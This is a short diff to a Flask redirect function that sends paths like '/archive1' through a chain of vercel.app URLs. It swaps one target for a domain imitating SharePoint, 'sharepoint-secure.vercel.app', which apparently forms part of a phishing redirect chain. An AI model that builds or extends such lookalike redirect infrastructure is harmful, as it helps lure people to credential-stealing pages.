@@ -5,7 +5,7 @@ app = Flask(__name__)
 # Define redirection rules based on path
 def get_redirect_url(path):
     if path == '/archive1':
-        return 'https://secure-sharing.vercel.app/archive2'
+        return 'https://sharepoint-secure.vercel.app/'
     elif path == '/archive2':
         return 'https://secure-sharing.vercel.app/archive3'
     elif path == '/archive3':
